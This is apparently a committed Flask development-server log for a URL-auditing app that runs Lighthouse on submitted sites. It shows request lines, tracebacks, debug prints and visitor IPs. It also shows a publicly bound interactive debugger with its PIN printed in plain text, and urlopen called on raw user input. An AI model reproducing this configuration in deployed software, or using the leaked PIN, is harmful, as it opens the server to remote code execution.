+86.186.194.64 - - [02/Dec/2020 11:10:58] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+86.186.194.64 - - [02/Dec/2020 11:10:58] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'dd'
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:33] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:49] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:49] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+77.101.234.187 - - [02/Dec/2020 11:18:49] "[36mGET /static/images/logo.svg HTTP/1.1[0m" 304 -
+77.101.234.187 - - [02/Dec/2020 11:18:57] "[35m[1mGET /report?report=104 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/02-12-2020-10:28-ingv.json'
+77.101.234.187 - - [02/Dec/2020 11:18:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:57] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:18:58] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:05] "[35m[1mGET /report?report=107 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 139, in report
+    class reportClass:
+  File "/home/FlaskApp/audt.py", line 153, in reportClass
+    altScoreAmount = len(data['audits']['image-alt']['details']['items'])
+KeyError: 'details'
+77.101.234.187 - - [02/Dec/2020 11:19:05] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:05] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:05] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:06] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:06] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:33] "[37mGET /report?report=103 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:19:46] "[37mGET /report?report=102 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:07] "[37mGET /report?report=76 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:11] "[37mGET /report?report=82 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:16] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:16] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+77.101.234.187 - - [02/Dec/2020 11:20:16] "[36mGET /static/images/logo.svg HTTP/1.1[0m" 304 -
+77.101.234.187 - - [02/Dec/2020 11:20:16] "[36mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 304 -
+77.101.234.187 - - [02/Dec/2020 11:20:22] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://techterms.com/definition/jpeg ...
+
+77.101.234.187 - - [02/Dec/2020 11:20:25] "[37mGET /processurl?data=108 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:29] "[37mGET /processurl?data=108 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:32] "[37mGET /processurl?data=108 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:36] "[37mGET /processurl?data=108 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:20:40] "[32mGET /processurl?data=108 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 11:20:40] "[37mGET /report?report=108 HTTP/1.1[0m" 200 -
+36.71.136.90 - - [02/Dec/2020 11:24:14] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:27:03] "[37mGET /list HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:28:50] "[37mGET / HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:28:50] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:28:50] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:28:50] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:28:53] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:00] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'ewanlonnen.com'
+77.102.33.219 - - [02/Dec/2020 11:29:00] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:00] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:00] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:01] "[37mGET /?__debugger__=yes&cmd=resource&f=less.png HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:01] "[37mGET /?__debugger__=yes&cmd=resource&f=more.png HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:01] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:01] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:01] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:14] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on http://ewanlonnen.com ...
+
+77.102.33.219 - - [02/Dec/2020 11:29:18] "[37mGET /processurl?data=109 HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:21] "[37mGET /processurl?data=109 HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:25] "[37mGET /processurl?data=109 HTTP/1.1[0m" 200 -
+77.102.33.219 - - [02/Dec/2020 11:29:28] "[37mGET /processurl?data=109 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (http://ewanlonnen.com/) was redirected to http://ewanlonnen.com/?i=1. Try testing the second URL directly.
+
+
+77.102.33.219 - - [02/Dec/2020 11:29:32] "[32mGET /processurl?data=109 HTTP/1.1[0m" 302 -
+77.102.33.219 - - [02/Dec/2020 11:29:32] "[37mGET /report?report=109 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:14] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:14] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:16] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:16] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:16] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:16] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:40:22] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:47:05] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:47:24] "[37mGET /report?report=109 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:50:11] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 11:50:12] "[37mGET /list HTTP/1.1[0m" 200 -
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+http://www.google.es
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+http://audt.javierlopez.design
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+https://www.youtube.com/watch?v=XIIP8eS3tvc
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+https://www.pinayu.com
+https://www.javierlopez.design
+HERE!!!
+not found...
+https://www.google.com
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+https://www.pinayu.com
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+HERE!!!
+not found...
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+HERE!!!
+not found...
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+HERE!!!
+___READY TO READ!!!!
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+https://www.google.com
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+https://www.javierlopez.design
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+https://www.java.com/download/
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+https://enucs.org.uk
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+ftp://ftp.ingv.it/pub/manuela.sbarra/Data%20Mining%20Practical%20Machine%20Learning%20Tools%20and%20Techniques%20-%20WEKA.pdf
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+NO PREVIOUS AUDIT!!!
+https://webtech-napier-ui.ew.r.appspot.com/login
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+https://webtech-napier-ui.ew.r.appspot.com/
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+http://harikharel.com/
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+https://techterms.com/definition/jpeg
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+http://ewanlonnen.com
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+not found...
+HERE!!!
+___READY TO READ!!!!
+NO PREVIOUS AUDIT!!!
+NO PREVIOUS AUDIT!!!
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+2.97.202.181 - - [02/Dec/2020 11:54:19] "[37mGET / HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:19] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:19] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:19] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:19] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+2.97.202.181 - - [02/Dec/2020 11:54:53] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+2.97.202.181 - - [02/Dec/2020 11:54:53] "[37mGET / HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:53] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:53] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:53] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:54:53] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+2.97.202.181 - - [02/Dec/2020 11:55:04] "[37mGET / HTTP/1.1[0m" 200 -
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+ * Detected change in '/home/FlaskApp/audt.py', reloading
+ * Restarting with stat
+  File "/home/FlaskApp/audt.py", line 7
+    import 
+          ^
+SyntaxError: invalid syntax
+ * Serving Flask app "audt" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+77.101.234.187 - - [02/Dec/2020 13:32:51] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on http://thefifthtaste.co.uk ...
+
+77.101.234.187 - - [02/Dec/2020 13:32:54] "[37mGET /processurl?data=130 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:32:58] "[37mGET /processurl?data=130 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (http://thefifthtaste.co.uk/) was redirected to https://www.thefifthtaste.co.uk/. Try testing the second URL directly.
+
+
+77.101.234.187 - - [02/Dec/2020 13:33:01] "[32mGET /processurl?data=130 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 13:33:01] "[37mGET /report?report=130 HTTP/1.1[0m" 200 -
+45.125.65.87 - - [02/Dec/2020 13:38:37] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:52:32] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:56:14] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:58:25] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:58:25] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:58:38] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:58:48] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:59:00] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 13:59:00] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:02:42] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:02:42] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:06:48] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:07:14] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.javierlopez.design ...
+
+77.101.234.187 - - [02/Dec/2020 14:07:18] "[37mGET /processurl?data=131 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:07:21] "[37mGET /processurl?data=131 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:07:24] "[32mGET /processurl?data=131 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 14:07:24] "[37mGET /report?report=131 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:08:17] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:08:30] "[37mGET /report?report=120 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:08:37] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:08:40] "[37mGET /report?report=99 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:08:47] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:08:50] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:22:43] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:23:09] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:23:26] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:23:33] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:23:42] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:23:47] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:23:59] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on https://www.javierlopez.design ...
+
+77.101.234.187 - - [02/Dec/2020 14:24:03] "[37mGET /processurl?data=132 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:24:06] "[37mGET /processurl?data=132 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:24:09] "[32mGET /processurl?data=132 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [02/Dec/2020 14:24:10] "[37mGET /report?report=132 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [02/Dec/2020 14:25:01] "[37mGET /list HTTP/1.1[0m" 200 -
